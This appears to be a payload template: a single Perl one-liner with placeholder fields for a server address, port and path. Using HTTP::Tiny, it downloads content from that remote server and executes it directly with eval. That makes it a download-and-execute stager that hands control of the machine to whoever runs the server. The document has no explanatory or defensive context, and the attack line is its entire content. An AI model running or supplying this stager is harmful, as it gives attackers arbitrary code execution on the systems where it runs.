perl -MHTTP::Tiny -e '$http=HTTP::Tiny->new();$r=$http->get("http://{{SERVER_IP}}:{{SERVER_PORT}}/{{URI}}");eval($r->{content});'
